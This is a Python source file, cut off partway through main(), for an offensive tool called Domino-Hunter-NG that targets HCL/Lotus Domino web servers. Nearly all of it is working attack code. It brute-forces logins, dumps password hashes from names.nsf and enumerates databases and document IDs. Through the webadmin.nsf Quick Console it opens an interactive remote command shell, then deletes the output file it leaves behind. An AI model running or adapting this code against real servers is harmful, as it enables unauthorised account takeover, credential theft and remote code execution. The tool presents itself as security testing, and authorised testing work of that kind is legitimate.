#!/usr/bin/env python3
import requests
import argparse
import os
import hashlib
import threading
import urllib3
import re
import json
import sys
import time
import random
import cmd
from urllib.parse import urljoin, urlparse
from concurrent.futures import ThreadPoolExecutor
from tqdm import tqdm
from colorama import init, Fore, Style

try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None

init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

DEFAULT_WORDLIST = "domino-list.txt"
DEFAULT_PORT = 80
DEFAULT_SSL_PORT = 443

NSF_COMMANDS = [
    "?OpenDocument", "?EditDocument", "?CreateDocument", "?OpenServer",
    "$DefaultNav?OpenNavigator", "?OpenView", "?ReadViewEntries",
    "?ReadDesign", "$first?OpenDocument", "$defaultform?OpenForm",
    "?ReadEntries", "?OpenForm", "?OpenFrameset", "?OpenDatabase",
    "?Login", "?Logout", "?ChangePassword", "?OpenAgent",
    "?OpenPage", "?SaveDocument", "?OpenNavigator", "?OpenByKey",
    "ReadViewEntries&OutputFormat=JSON",
]

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
}

seen_hashes = {}
seen_hash_lock = threading.Lock()
print_lock = threading.Lock()
auth_failure_pattern = "error"

# UNID / noteid tracking per DB
collected_unids = set()  # global dedupe by UNID
unid_map = {}            # { db_path: [ {"unid": ..., "noteid": ..., "source": ...}, ... ] }

# Commands that worked per DB
working_commands = {}    # { db_path: [cmds...] }

# DB registry for JSON output
db_registry = {}         # { db_path: {"url": ..., "status": ...} }


def normalize_db_path(path: str) -> str:
    return path.lstrip("/")


def is_nsf_path(path: str) -> bool:
    return ".nsf" in path.lower()


def get_url(session, url, proxy=None):
    try:
        proxies = {"http": proxy, "https": proxy} if proxy else None
        resp = session.get(
            url,
            headers=HEADERS,
            timeout=6,
            allow_redirects=True,
            verify=False,
            proxies=proxies,
        )
        content = resp.text
        status = resp.status_code

        chash = hashlib.sha1(content.encode()).hexdigest()
        with seen_hash_lock:
            if chash in seen_hashes:
                return status, content, "DUPLICATE"
            seen_hashes[chash] = url

        return status, content, ""
    except requests.RequestException as e:
        return 0, str(e), ""


def extract_unids_from_readviewentries(content, base: str):
    """Parse XML-style <viewentry> blocks for UNID and noteid."""
    hits = re.findall(
        r'<viewentry[^>]*unid="([^"]+)"[^>]*noteid="([^"]+)"[^>]*>',
        content,
        re.IGNORECASE,
    )

    # Try to map this to a specific DB path (e.g. /domcfg.nsf from /domcfg.nsf/View?ReadViewEntries)
    m = re.search(r'(/?[^?\s]*\.nsf)', base, re.IGNORECASE)
    db_key = normalize_db_path(m.group(1)) if m else None

    for unid, noteid in hits:
        with print_lock:
            if unid not in collected_unids:
                collected_unids.add(unid)
                print(f"{Fore.CYAN}[UNID] {unid} / {noteid} from {base}")
        if db_key:
            unid_map.setdefault(db_key, []).append(
                {"unid": unid, "noteid": noteid, "source": base}
            )


def extract_unids_from_json_viewentries(content, base: str):
    """
    Very loose JSON parser for Domino JSON view entries.
    Looks for 'unid' and 'noteid' fields in proximity.
    """
    hits = re.findall(
        r'"unid"\s*:\s*"([^"]+)"[^}]+?"noteid"\s*:\s*"([^"]+)"',
        content,
        re.IGNORECASE,
    )

    m = re.search(r'(/?[^?\s]*\.nsf)', base, re.IGNORECASE)
    db_key = normalize_db_path(m.group(1)) if m else None

    for unid, noteid in hits:
        with print_lock:
            if unid not in collected_unids:
                collected_unids.add(unid)
                print(f"{Fore.CYAN}[UNID-JSON] {unid} / {noteid} from {base}")
        if db_key:
            unid_map.setdefault(db_key, []).append(
                {"unid": unid, "noteid": noteid, "source": base}
            )


def extract_frame_sources(content):
    return re.findall(
        r'<frame[^>]+src=["\']([^"\']+)["\']', content, re.IGNORECASE
    )


def login(session, base_url, username, password, proxy=None):
    """Authenticate to Domino server using form-based authentication."""
    login_url = urljoin(base_url, "names.nsf/?Login")
    data = {
        "Username": username,
        "Password": password,
        "%%ModDate": "0000000000000000",
    }
    proxies = {"http": proxy, "https": proxy} if proxy else None
    try:
        resp = session.post(
            login_url,
            data=data,
            headers=HEADERS,
            timeout=5,
            verify=False,
            proxies=proxies,
        )
        # Check for successful authentication
        if "error" not in resp.text.lower() and (
            'DomAuthSessId' in session.cookies or 'LtpaToken' in session.cookies
        ):
            return True
        return False
    except Exception:
        return False


def check_access(session, base_url, username=None, password=None, proxy=None):
    """Check access to names.nsf and webadmin.nsf."""
    proxies = {"http": proxy, "https": proxy} if proxy else None
    results = {"names.nsf": None, "webadmin.nsf": None}

    # Setup auth if provided
    if username and password:
        # Try form-based login first
        if login(session, base_url, username, password, proxy):
            pass  # Cookies are set in session
        else:
            # Fall back to Basic Auth
            session.auth = (username, password)

    for nsf in results.keys():
        try:
            url = urljoin(base_url, nsf)
            resp = session.get(url, headers=HEADERS, timeout=5, verify=False, proxies=proxies)

            if resp.status_code == 200:
                results[nsf] = True
            elif resp.status_code == 401:
                results[nsf] = False
            else:
                results[nsf] = None
        except Exception:
            results[nsf] = None

    return results


def fingerprint_server(session, base_url, proxy=None):
    """Fingerprint Domino server version."""
    version_paths = [
        'download/filesets/l_LOTUS_SCRIPT.inf',
        'download/filesets/n_LOTUS_SCRIPT.inf',
        'download/filesets/l_SEARCH.inf',
        'download/filesets/n_SEARCH.inf',
        'api',
        'homepage.nsf',
        'help/readme.nsf?OpenAbout',
        'iNotes/Forms5.nsf',
        'iNotes/Forms6.nsf',
        'iNotes/Forms7.nsf',
        'iNotes/Forms8.nsf',
        'iNotes/Forms9.nsf',
        'iNotes/Forms85.nsf',
    ]

    proxies = {"http": proxy, "https": proxy} if proxy else None
    version_regex = re.compile(r'Release\s+([\d.]+)', re.IGNORECASE)

    print(f"{Fore.YELLOW}[*] Fingerprinting Domino server...")

    for path in version_paths:
        try:
            url = urljoin(base_url, path)
            resp = session.get(url, headers=HEADERS, timeout=5, verify=False, proxies=proxies)

            match = version_regex.search(resp.text)
            if match:
                version = match.group(1)
                print(f"{Fore.GREEN}[+] Domino version: {version}")
                return version
        except Exception:
            continue

    print(f"{Fore.YELLOW}[-] Unable to identify Domino version")
    return None


def brute_force_accounts(session, base_url, userlist_path, password=None, proxy=None, verbose=False):
    """Perform reverse brute force attack against names.nsf."""
    if not os.path.exists(userlist_path):
        print(f"{Fore.RED}[!] Userlist file not found: {userlist_path}")
        return []

    with open(userlist_path, "r") as f:
        usernames = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    print(f"{Fore.YELLOW}[*] Starting brute force with {len(usernames)} usernames...")
    if password:
        print(f"{Fore.YELLOW}[*] Using password: {password}")
    else:
        print(f"{Fore.YELLOW}[*] Using username as password")

    valid_accounts = []
    proxies = {"http": proxy, "https": proxy} if proxy else None

    for username in tqdm(usernames, desc="Brute forcing"):
        # Create new session for each attempt
        test_session = requests.Session()

        # Use username as password if no password provided
        test_password = password if password else username

        # Try to authenticate
        if login(test_session, base_url, username, test_password, proxy):
            # Check what they can access
            access = check_access(test_session, base_url, username, test_password, proxy)

            if access.get("webadmin.nsf"):
                account_type = "Admin"
                valid_accounts.append((username, test_password, account_type))
                print(f"\n{Fore.GREEN}[+] ADMIN: {username}:{test_password}")
            elif access.get("names.nsf"):
                account_type = "User"
                valid_accounts.append((username, test_password, account_type))
                print(f"\n{Fore.GREEN}[+] USER: {username}:{test_password}")

        # Small delay to avoid lockout
        time.sleep(random.uniform(0.1, 0.5))

    return valid_accounts


def dump_hashes(session, base_url, username=None, password=None, proxy=None, output_prefix="domino"):
    """Dump account hashes from names.nsf."""
    if not BeautifulSoup:
        print(f"{Fore.RED}[!] BeautifulSoup4 is required for hash dumping. Install with: pip install beautifulsoup4")
        return []

    proxies = {"http": proxy, "https": proxy} if proxy else None

    # Check access
    access = check_access(session, base_url, username, password, proxy)
    if not access.get("names.nsf"):
        print(f"{Fore.RED}[!] Cannot access names.nsf - authentication required or failed")
        return []

    print(f"{Fore.YELLOW}[*] Enumerating account URLs...")

    account_urls = []
    account_regex = re.compile(r'/names\.nsf/([a-zA-Z0-9]{32})', re.IGNORECASE)

    # Enumerate account profile URLs
    for page in range(1, 10000, 1000):
        try:
            url = f"{base_url}names.nsf/74eeb4310586c7d885256a7d00693f10?ReadForm&Start={page}&Count=1000"
            resp = session.get(url, headers=HEADERS, timeout=10, verify=False, proxies=proxies)

            soup = BeautifulSoup(resp.text, 'html.parser')

            # Break if no documents found
            if 'No documents found' in resp.text:
                break

            # Extract account URLs
            links = soup.find_all('a', href=re.compile(r'/names\.nsf/[a-zA-Z0-9]{32}'))
            for link in links:
                href = link.get('href')
                match = account_regex.search(href)
                if match:
                    account_id = match.group(1)
                    account_url = f"{base_url}names.nsf/{account_id}?OpenDocument"
                    if account_url not in account_urls:
                        account_urls.append(account_url)
        except KeyboardInterrupt:
            break
        except Exception as e:
            if page == 1:
                print(f"{Fore.RED}[!] Error enumerating accounts: {e}")
                return []
            break

    print(f"{Fore.GREEN}[+] Found {len(account_urls)} accounts")
    print(f"{Fore.YELLOW}[*] Dumping hashes...")

    hashes = {"domino5": [], "domino6": [], "domino8": []}

    for account_url in tqdm(account_urls, desc="Dumping hashes"):
        try:
            resp = session.get(account_url, headers=HEADERS, timeout=5, verify=False, proxies=proxies)
            soup = BeautifulSoup(resp.text, 'html.parser')

            # Extract username
            username_field = None
            for field in ['$dspFullName', '$dspShortName', 'FullName', 'ShortName']:
                elem = soup.find('input', attrs={'name': field})
                if elem and elem.get('value'):
                    username_field = elem.get('value')
                    break

            # Extract hash
            hash_field = None
            for field in ['$dspHTTPPassword', 'dspHTTPPassword', 'HTTPPassword']:
                elem = soup.find('input', attrs={'name': field})
                if elem and elem.get('value'):
                    hash_field = elem.get('value')
                    break

            if username_field and hash_field:
                hash_len = len(hash_field)

                # Domino 5: 32 chars (MD5) - may have parens
                if hash_len == 34 and hash_field.startswith('('):
                    clean_hash = hash_field.strip('()')
                    hashes["domino5"].append(f"{username_field}:{clean_hash}")
                    print(f"{Fore.CYAN}[HASH5] {username_field}:{clean_hash}")

                # Domino 6: 20 chars in parens
                elif hash_len == 22 and hash_field.startswith('('):
                    hashes["domino6"].append(f"{username_field}:{hash_field}")
                    print(f"{Fore.CYAN}[HASH6] {username_field}:{hash_field}")

                # Domino 8: longer hash in parens
                elif hash_len > 22:
                    hashes["domino8"].append(f"{username_field}:{hash_field}")
                    print(f"{Fore.CYAN}[HASH8] {username_field}:{hash_field}")

        except Exception:
            continue

    # Write to files
    for hash_type, hash_list in hashes.items():
        if hash_list:
            filename = f"{output_prefix}_{hash_type}_hashes.txt"
            with open(filename, "w") as f:
                for h in hash_list:
                    f.write(h + "\n")
            print(f"{Fore.GREEN}[+] Wrote {len(hash_list)} hashes to {filename}")

    total_hashes = sum(len(v) for v in hashes.values())
    return total_hashes


class QuickConsoleShell(cmd.Cmd):
    """Interactive shell for Domino Quick Console."""

    def __init__(self, session, base_url, info, proxy=None):
        super().__init__()
        self.session = session
        self.base_url = base_url
        self.info = info
        self.proxy = proxy
        self.proxies = {"http": proxy, "https": proxy} if proxy else None

        if info['os'] == 'windows':
            self.del_command = 'del'
            self.prompt = f"{info['path'].split(':')[0]}:\\Windows\\System32> "
            self.command_template = 'load cmd /c {command} > "{path}\\domino\\html\\download\\filesets\\log.txt"'
        else:
            self.del_command = 'rm'
            self.prompt = f"{info['user']}@{info['hostname']}:/local/notesdata$ "
            self.command_template = 'load /bin/bash -c "{command} > {path}/domino/html/download/filesets/log.txt"'

    def emptyline(self):
        pass

    def default(self, line):
        """Execute command via Quick Console."""
        command = self.command_template.format(command=line, path=self.info['path'])

        # Quick Console commands must be less than 255 characters
        if len(command) > 255:
            print(f"{Fore.RED}[!] Command too long (max 255 chars)")
            return

        try:
            # Send command
            cmd_url = f"{self.base_url}webadmin.nsf/agReadConsoleData$UserL2?OpenAgent&Mode=QuickConsole&Command={command}&{int(time.time()*1000)}"
            resp = self.session.get(cmd_url, headers=HEADERS, timeout=10, verify=False, proxies=self.proxies)

            if 'Command has been executed' in resp.text:
                # Fetch output
                time.sleep(0.5)  # Give it time to write
                output_url = f"{self.base_url}download/filesets/log.txt"
                output_resp = self.session.get(output_url, headers=HEADERS, timeout=5, verify=False, proxies=self.proxies)

                if output_resp.status_code == 200:
                    print(output_resp.text)
                else:
                    print(f"{Fore.YELLOW}[!] No output or output file not found")
            else:
                print(f"{Fore.RED}[!] Failed to execute command")

        except Exception as e:
            print(f"{Fore.RED}[!] Error executing command: {e}")

    def do_exit(self, line):
        """Exit the Quick Console shell."""
        # Clean up log file
        try:
            if self.info['os'] == 'windows':
                cleanup_cmd = f'load cmd /c del "{self.info["path"]}\\domino\\html\\download\\filesets\\log.txt"'
            else:
                cleanup_cmd = f'load /bin/bash -c "rm {self.info["path"]}/domino/html/download/filesets/log.txt"'

            cmd_url = f"{self.base_url}webadmin.nsf/agReadConsoleData$UserL2?OpenAgent&Mode=QuickConsole&Command={cleanup_cmd}&{int(time.time()*1000)}"
            self.session.get(cmd_url, headers=HEADERS, timeout=5, verify=False, proxies=self.proxies)
        except:
            pass

        print(f"{Fore.YELLOW}[*] Exiting Quick Console")
        return True

    def do_EOF(self, line):
        return self.do_exit(line)


def quick_console(session, base_url, username=None, password=None, proxy=None):
    """Interactive Quick Console access via webadmin.nsf."""
    proxies = {"http": proxy, "https": proxy} if proxy else None

    # Check access
    access = check_access(session, base_url, username, password, proxy)
    if not access.get("webadmin.nsf"):
        print(f"{Fore.RED}[!] Cannot access webadmin.nsf - admin authentication required")
        return

    print(f"{Fore.YELLOW}[*] Accessing Quick Console...")

    # Get server info
    try:
        info_url = f"{base_url}webadmin.nsf/fmpgHomepage?ReadForm"
        resp = session.get(info_url, headers=HEADERS, timeout=10, verify=False, proxies=proxies)

        info = {
            'os': None,
            'path': None,
            'user': None,
            'hostname': None
        }

        # Determine OS
        if 'UNIX' in resp.text:
            info['os'] = 'linux'
            user_command = 'echo $HOSTNAME:$USER'
            domino_paths = ['/local/notesdata', '/opt/ibm/domino/data', '/opt/lotus/notes/data']
        else:
            info['os'] = 'windows'
            user_command = 'whoami'
            domino_paths = [
                'C:\\Program Files\\IBM\\Domino\\data',
                'C:\\Program Files\\IBM\\Lotus\\Domino\\data',
                'C:\\Program Files (x86)\\IBM\\Domino\\data',
                'C:\\Lotus\\Domino\\data'
            ]

        # Try to detect path from response
        path_regex = re.compile(r'([A-Z]:\\.*?\\data|/.*?/data)', re.IGNORECASE)
        path_match = path_regex.search(resp.text)
        if path_match:
            detected_path = path_match.group(1).replace('\\\\', '\\')
            if detected_path not in domino_paths:
                domino_paths.insert(0, detected_path)

        # Find correct path by testing
        for test_path in domino_paths:
            path_id = hashlib.md5(test_path.encode()).hexdigest()

            if info['os'] == 'windows':
                test_cmd = f'load cmd /c echo {path_id} > "{test_path}\\domino\\html\\download\\filesets\\log.txt"'
            else:
                test_cmd = f'load /bin/bash -c "echo {path_id} > {test_path}/domino/html/download/filesets/log.txt"'

            try:
                cmd_url = f"{base_url}webadmin.nsf/agReadConsoleData$UserL2?OpenAgent&Mode=QuickConsole&Command={test_cmd}&{int(time.time()*1000)}"
                cmd_resp = session.get(cmd_url, headers=HEADERS, timeout=5, verify=False, proxies=proxies)

                if 'Command has been executed' in cmd_resp.text:
                    time.sleep(0.5)
                    output_url = f"{base_url}download/filesets/log.txt"
                    output_resp = session.get(output_url, headers=HEADERS, timeout=5, verify=False, proxies=proxies)

                    if path_id in output_resp.text:
                        info['path'] = test_path
                        break
            except:
                continue

        if not info['path']:
            print(f"{Fore.RED}[!] Could not determine Domino install path")
            return

        # Get user and hostname
        if info['os'] == 'windows':
            user_cmd = f'load cmd /c whoami > "{info["path"]}\\domino\\html\\download\\filesets\\log.txt"'
        else:
            user_cmd = f'load /bin/bash -c "echo $HOSTNAME:$USER > {info["path"]}/domino/html/download/filesets/log.txt"'

        cmd_url = f"{base_url}webadmin.nsf/agReadConsoleData$UserL2?OpenAgent&Mode=QuickConsole&Command={user_cmd}&{int(time.time()*1000)}"
        session.get(cmd_url, headers=HEADERS, timeout=5, verify=False, proxies=proxies)
        time.sleep(0.5)

        output_url = f"{base_url}download/filesets/log.txt"
        output_resp = session.get(output_url, headers=HEADERS, timeout=5, verify=False, proxies=proxies)

        if info['os'] == 'windows':
            info['user'] = output_resp.text.strip()
            info['hostname'] = 'Windows'
        else:
            parts = output_resp.text.strip().split(':')
            if len(parts) == 2:
                info['hostname'], info['user'] = parts

        print(f"{Fore.GREEN}[+] Quick Console active")
        print(f"{Fore.GREEN}[+] OS: {info['os']}")
        print(f"{Fore.GREEN}[+] Path: {info['path']}")
        print(f"{Fore.GREEN}[+] Running as: {info['user']}")
        print(f"{Fore.YELLOW}[*] Type 'exit' to quit\n")

        # Start interactive shell
        shell = QuickConsoleShell(session, base_url, info, proxy)
        shell.cmdloop()

    except Exception as e:
        print(f"{Fore.RED}[!] Error accessing Quick Console: {e}")
        return


def scan_target(session, base_url, path, output, proxy=None, verbose=False):
    """
    - For NSF paths: full Domino logic (frameset follow, commands, UNIDs, etc.)
    - For non-NSF (dirs/servlets/etc): simple probe (only logs 200s unless verbose)
    """
    full_url = urljoin(base_url, path)
    status, content, note = get_url(session, full_url, proxy)

    # Non-NSF: just log basic status
    if not is_nsf_path(path):
        if status == 200:
            with print_lock:
                output.append(f"{Fore.GREEN}{full_url} -> {status}")
        elif status >= 400 and verbose:
            with print_lock:
                output.append(f"{Fore.MAGENTA}{full_url} -> {status}")
        return

    # NSF path logic from here on
    db_key = normalize_db_path(path)
    if db_key not in db_registry:
        db_registry[db_key] = {"url": full_url, "status": status}
    else:
        db_registry[db_key]["status"] = status

    working = []

    if status == 200:
        with print_lock:
            output.append(f"{Fore.GREEN}{full_url} -> {status}")


        frames = extract_frame_sources(content)
        for frame_src in frames:
            frame_url = urljoin(base_url, frame_src)
            f_status, f_content, f_note = get_url(session, frame_url, proxy)

            if f_status == 200:
                with print_lock:
                    output.append(f"  {Fore.GREEN}{frame_url} -> {f_status}")


                extract_unids_from_readviewentries(f_content, frame_src)


                if "?" in frame_src:
                    view_base = frame_src.split("?", 1)[0]
                else:
                    view_base = frame_src

                rv_rel = f"{view_base}?ReadViewEntries"
                rv_url = urljoin(base_url, rv_rel)
                rv_status, rv_content, rv_note = get_url(session, rv_url, proxy)
                if rv_status == 200:
                    with print_lock:
                        output.append(f"  {Fore.GREEN}{rv_url} -> {rv_status}")
                    extract_unids_from_readviewentries(rv_content, rv_rel)


                rv_json_rel = f"{view_base}?ReadViewEntries&OutputFormat=JSON"
                rv_json_url = urljoin(base_url, rv_json_rel)
                rvj_status, rvj_content, rvj_note = get_url(session, rv_json_url, proxy)
                if rvj_status == 200:
                    with print_lock:
                        output.append(f"  {Fore.GREEN}{rv_json_url} -> {rvj_status}")
                    extract_unids_from_json_viewentries(rvj_content, rv_json_rel)


        sep = "&" if "?" in full_url else "?"
        direct_rv_url = f"{full_url}{sep}ReadViewEntries"
        d_status, d_content, d_note = get_url(session, direct_rv_url, proxy)
        if d_status == 200:
            with print_lock:
                output.append(f"  {Fore.GREEN}{direct_rv_url} -> {d_status}")
            extract_unids_from_readviewentries(d_content, path)
            working.append("?ReadViewEntries")


        direct_rv_json_url = f"{full_url}{sep}ReadViewEntries&OutputFormat=JSON"
        dj_status, dj_content, dj_note = get_url(session, direct_rv_json_url, proxy)
        if dj_status == 200:
            with print_lock:
                output.append(f"  {Fore.GREEN}{direct_rv_json_url} -> {dj_status}")
            extract_unids_from_json_viewentries(dj_content, path)
            working.append("ReadViewEntries&OutputFormat=JSON")


        for command in NSF_COMMANDS:
            sep = "&" if "?" in full_url else "?"


            test_url = f"{full_url}{sep}{command}"

            c_status, c_content, c_note = get_url(session, test_url, proxy)

            if c_status == 200:
                with print_lock:
                    output.append(f"  {Fore.GREEN}{command} -> 200")
                working.append(command)

                if command == "?ReadViewEntries":
                    extract_unids_from_readviewentries(c_content, path)
                elif command.lower().startswith("readviewentries&outputformat=json"):
                    extract_unids_from_json_viewentries(c_content, path)

            elif c_status >= 400:
                if verbose:
                    with print_lock:
                        output.append(f"  {Fore.MAGENTA}{command} -> {c_status}")
            elif c_note == "DUPLICATE" and not verbose:
                continue
            elif verbose:
                with print_lock:
                    output.append(f"  {Fore.YELLOW}{command} -> {c_status} {c_note}")

    elif status >= 400:
        if verbose:
            with print_lock:
                output.append(f"{Fore.MAGENTA}{full_url} -> {status}")
    elif note == "DUPLICATE" and not verbose:
        return
    elif verbose:
        with print_lock:
            output.append(f"{Fore.YELLOW}{full_url} -> {status} {note}")


    if working:
        with print_lock:
            output.append(
                f"{Fore.BLUE}[+] Commands that worked on {path}: "
                f"{', '.join(sorted(set(working)))}"
            )
        working_commands[db_key] = working


def scan_wordlist(session, base_url, wordlist, threads, output, proxy=None, verbose=False):
    if not os.path.exists(wordlist):
        raise FileNotFoundError(f"Wordlist file not found: {wordlist}")

    with open(wordlist, "r") as f:
        lines = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    with ThreadPoolExecutor(max_workers=threads) as executor:
        list(
            tqdm(
                executor.map(
                    lambda path: scan_target(
                        session, base_url, path, output, proxy, verbose
                    ),
                    lines,
                ),
                total=len(lines),
                desc="Scanning",
            )
        )


def load_unids_file(path: str):

    entries = []
    if not os.path.exists(path):
        print(f"{Fore.RED}[!] UNID file not found: {path}")
        return entries

    with open(path, "r") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            parts = line.split()
            if len(parts) < 2:
                continue

            if len(parts) >= 4:
                db_path, unid, noteid = parts[0], parts[1], parts[2]
            elif len(parts) == 3:
                db_path, unid, noteid = parts[0], parts[1], parts[2]
            else:
                # Fallback: assume db_path + unid only
                db_path, unid, noteid = parts[0], parts[1], ""

            entries.append(
                {
                    "db_path": db_path,
                    "unid": unid,
                    "noteid": noteid,
                }
            )
    return entries


def exploit_unids(session, base_url, unid_entries, output, proxy=None, verbose=False):

    for e in unid_entries:
        db_path = e.get("db_path")
        unid = e.get("unid")
        noteid = e.get("noteid")

        if not unid:
            continue

        if db_path:
            db_url = urljoin(base_url, db_path.lstrip("/"))
        else:
            db_url = base_url

        # 1) ?OpenDocument&UNID=<unid>
        url1 = f"{db_url}?OpenDocument&UNID={unid}"
        s1, c1, n1 = get_url(session, url1, proxy)
        with print_lock:
            if s1 == 200:
                output.append(f"{Fore.GREEN}[UNID-OPEN] {url1} -> 200")
            elif s1 >= 400 and not verbose:
                pass
            else:
                output.append(f"{Fore.YELLOW}[UNID-OPEN] {url1} -> {s1} {n1}")

        # 2) /0/<NOTEID>?OpenDocument
        if noteid:
            url2 = f"{db_url}/0/{noteid}?OpenDocument"
            s2, c2, n2 = get_url(session, url2, proxy)
            with print_lock:
                if s2 == 200:
                    output.append(f"{Fore.GREEN}[NOTEID-OPEN] {url2} -> 200")
                elif s2 >= 400 and not verbose:
                    pass
                else:
                    output.append(f"{Fore.YELLOW}[NOTEID-OPEN] {url2} -> {s2} {n2}")


def main():
    parser = argparse.ArgumentParser(
        description="Domino-Hunter-NG v2.0 - Comprehensive HCL/Lotus Domino Security Testing Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Fingerprint server
  %(prog)s --host domino.example.com --fingerprint

  # Scan for NSF files with authentication
  %(prog)s --host domino.example.com -u admin:password --scan

  # Brute force credentials
  %(prog)s --host domino.example.com --brute-force users.txt --password Password123

  # Dump password hashes (requires valid credentials)
  %(prog)s --host domino.example.com -u admin:password --dump-hashes

  # Access Quick Console (requires admin credentials)
  %(prog)s --host domino.example.com -u admin:password --quick-console

  # Full scan with all features
  %(prog)s --host domino.example.com -u admin:password --fingerprint --scan --dump-hashes -l output.txt
        """
    )

    # Core arguments
    parser.add_argument("--host", dest="host", required=True, help="Target host or IP")
    parser.add_argument("-u", dest="creds", help="Username:Password for authentication")
    parser.add_argument("--https", action="store_true", help="Use HTTPS instead of HTTP")
    parser.add_argument("--port", type=int, help="Custom port number")
    parser.add_argument(
        "--proxy", dest="proxy", help="HTTP proxy (e.g. http://127.0.0.1:8080)"
    )
    parser.add_argument(
        "--verbose",
        action="store_true",
        help="Show 4xx, duplicates, and all output",
    )

    # Action arguments - what to do
    action_group = parser.add_argument_group('actions', 'What to do (can combine multiple)')
    action_group.add_argument(
        "--fingerprint",
        action="store_true",
        help="Fingerprint the Domino server version and check access to key NSF files",
    )
    action_group.add_argument(
        "--scan",
        action="store_true",
        help="Scan for NSF files, test commands, extract UNIDs",
    )
    action_group.add_argument(
        "--brute-force",
        dest="brute_force",
        metavar="USERLIST",
        help="Brute force credentials using userlist file",
    )
    action_group.add_argument(
        "--dump-hashes",
        dest="dump_hashes",
        action="store_true",
        help="Dump account password hashes from names.nsf (requires auth)",
    )
    action_group.add_argument(
        "--quick-console",
        dest="quick_console",
        action="store_true",
        help="Access interactive Quick Console shell via webadmin.nsf (requires admin)",
    )

    # Scan-specific options
    scan_group = parser.add_argument_group('scan options', 'Options for --scan mode')
    scan_group.add_argument(
        "-f",
        dest="wordlist",
        default=DEFAULT_WORDLIST,
        help=f"Path to NSF file wordlist (default: {DEFAULT_WORDLIST})",
    )
    scan_group.add_argument(
        "--threads", dest="threads", type=int, default=10, help="Number of concurrent threads (default: 10)"
    )
    scan_group.add_argument(
        "--use-unids",
        dest="use_unids",
        help="UNID file to load (defaults to logfile.unids if -l is set)",
    )
    scan_group.add_argument(
        "--open-unids",
        action="store_true",
        help="Actively try to open UNIDs/noteids with ?OpenDocument & /0/<NOTEID>?OpenDocument",
    )

    # Brute force options
    brute_group = parser.add_argument_group('brute force options', 'Options for --brute-force mode')
    brute_group.add_argument(
        "--password",
        dest="password",
        help="Password to use for brute force (if not set, uses username as password)",
    )

    # Output options
    output_group = parser.add_argument_group('output options', 'Where to save results')
    output_group.add_argument("-l", dest="logfile", help="Logfile to write output")
    output_group.add_argument(
        "--json-out",
        dest="json_out",
        help="Write structured JSON of DBs, working commands, and UNIDs to this file",
    )
    output_group.add_argument(
        "--hash-prefix",
        dest="hash_prefix",
        default="domino",
        help="Prefix for hash dump output files (default: domino)",
    )

    args = parser.parse_args()

    protocol = "https" if args.https else "http"
    port = args.port if args.port else (DEFAULT_SSL_PORT if args.https else DEFAULT_PORT)
    base_url = f"{protocol}://{args.host}:{port}/"

    # Check if any action was specified
    if not any([args.fingerprint, args.scan, args.brute_force, args.dump_hashes, args.quick_console]):
        print(f"{Fore.RED}[!] No action specified. Use --fingerprint, --scan, --brute-force, --dump-hashes, or --quick-console")
        print(f"{Fore.YELLOW}[*] Use -h for help")
        return

    session = requests.Session()
    username = None
    password = None

    # Parse credentials if provided
    if args.creds:
        if ":" not in args.creds:
            print(f"{Fore.RED}[-] Invalid credentials format. Use username:password")
            return
        username, password = args.creds.split(":", 1)

    print(f"{Fore.CYAN}{'='*60}")
    print(f"{Fore.CYAN}Domino-Hunter-NG v2.0")
    print(f"{Fore.CYAN}Target: {base_url}")
    if username:
        print(f"{Fore.CYAN}Auth: {username}:{'*' * len(password)}")
    print(f"{Fore.CYAN}{'='*60}\n")

    # ACTION 1: Fingerprint
    if args.fingerprint:
        fingerprint_server(session, base_url, args.proxy)

        # Check access to key NSF files
        access = check_access(session, base_url, username, password, args.proxy)
        for nsf, result in access.items():
            if result is True:
                if username:
                    print(f"{Fore.GREEN}[+] {username} has access to {nsf}")
                else:
                    print(f"{Fore.GREEN}[+] {nsf} does not require authentication")
            elif result is False:
                print(f"{Fore.YELLOW}[-] {nsf} requires authentication")
            else:
                print(f"{Fore.RED}[-] Could not find {nsf}")
        print()

    # ACTION 2: Brute Force
    if args.brute_force:
        valid_accounts = brute_force_accounts(
            session, base_url, args.brute_force, args.password, args.proxy, args.verbose
        )

        if valid_accounts:
            print(f"\n{Fore.GREEN}[+] Found {len(valid_accounts)} valid accounts:")
            print(f"{Fore.GREEN}{'Username':<20} {'Password':<20} {'Type':<10}")
            print(f"{Fore.GREEN}{'-'*50}")
            for user, pwd, acc_type in valid_accounts:
                print(f"{Fore.GREEN}{user:<20} {pwd:<20} {acc_type:<10}")

            # Save to file if logfile specified
            if args.logfile:
                creds_file = args.logfile + ".creds"
                with open(creds_file, "w") as f:
                    for user, pwd, acc_type in valid_accounts:
                        f.write(f"{user}:{pwd}:{acc_type}\n")
                print(f"\n{Fore.GREEN}[+] Saved credentials to {creds_file}")
        else:
            print(f"\n{Fore.YELLOW}[-] No valid accounts found")
        print()

    # ACTION 3: Dump Hashes
    if args.dump_hashes:
        if not username or not password:
            print(f"{Fore.RED}[!] Hash dumping requires authentication (-u username:password)")
        else:
            # Authenticate first
            if login(session, base_url, username, password, args.proxy):
                print(f"{Fore.GREEN}[+] Authenticated as {username}")
                total = dump_hashes(session, base_url, username, password, args.proxy, args.hash_prefix)
                if total > 0:
                    print(f"\n{Fore.GREEN}[+] Successfully dumped {total} hashes")
                else:
                    print(f"\n{Fore.YELLOW}[-] No hashes found")
            else:
                print(f"{Fore.RED}[-] Authentication failed")
        print()

    # ACTION 4: Scan for NSF files
    output = []
    if args.scan:
        if username and password:
            if login(session, base_url, username, password, args.proxy):
                print(f"{Fore.GREEN}[+] Authenticated as {username}")
            else:
                print(f"{Fore.YELLOW}[-] Authentication failed, continuing without auth")

        scan_wordlist(session, base_url, args.wordlist, args.threads, output, args.proxy, args.verbose)

        # Handle UNID exploitation
        unid_entries = []
        if args.use_unids:
            unid_entries = load_unids_file(args.use_unids)
        elif args.open_unids and args.logfile:
            default_unid_file = args.logfile + ".unids"
            unid_entries = load_unids_file(default_unid_file)

        if args.open_unids and unid_entries:
            exploit_unids(session, base_url, unid_entries, output, args.proxy, args.verbose)

        # Print output
        for line in output:
            print(line)

        # Save to logfile
        if args.logfile:
            with open(args.logfile, "w") as f:
                for line in output:
